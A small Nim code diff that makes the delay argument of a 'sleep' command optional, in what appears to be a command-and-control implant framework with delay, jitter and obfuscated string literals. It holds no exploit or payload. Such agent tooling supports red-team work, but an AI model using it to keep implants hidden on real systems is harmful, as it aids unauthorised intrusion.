@@ -16,7 +16,7 @@ let module* = Module(
             description: protect("Update sleep delay settings."),
             example: protect("sleep 5 15"),
             arguments: @[
-                Argument(name: protect("delay"), description: protect("Delay in seconds."), argumentType: INT, isRequired: true),
+                Argument(name: protect("delay"), description: protect("Delay in seconds. Executing without arguments retrieves current sleep settings."), argumentType: INT, isRequired: false),
                 Argument(name: protect("jitter"), description: protect("Jitter in percent (0-100)."), argumentType: INT, isRequired: false)
             ],
             execute: executeSleep
